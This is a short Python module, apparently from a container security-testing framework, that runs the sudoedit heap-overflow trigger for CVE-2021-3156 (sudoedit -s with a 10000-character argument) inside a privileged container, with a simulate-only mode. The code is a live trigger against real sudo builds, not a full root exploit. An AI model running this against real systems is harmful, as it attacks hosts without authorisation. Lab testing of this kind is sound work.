# Path: attacks/cve_2021_3156.py

def run(container, simulate=False):
    print("[*] Running sudoedit Heap Overflow (CVE-2021-3156)...")

    if simulate:
        print(f"[SIMULATE] Would attempt to invoke sudoedit with crafted overflow arguments in '{container.name}'")
        print("[SIMULATE] If vulnerable, this would result in a heap buffer overflow and potential root access.")
        return "Simulated run: No command executed."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION
        # Run sudoedit with an overflow-inducing argument pattern
        command = "sudoedit -s '\\' `perl -e 'print \"A\" x 10000'`"
        result = container.exec_run(command, privileged=True)

        output = result.output.decode()
        print(f"[+] sudoedit output:\n{output}")
        return "Executed: sudoedit overflow pattern sent"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
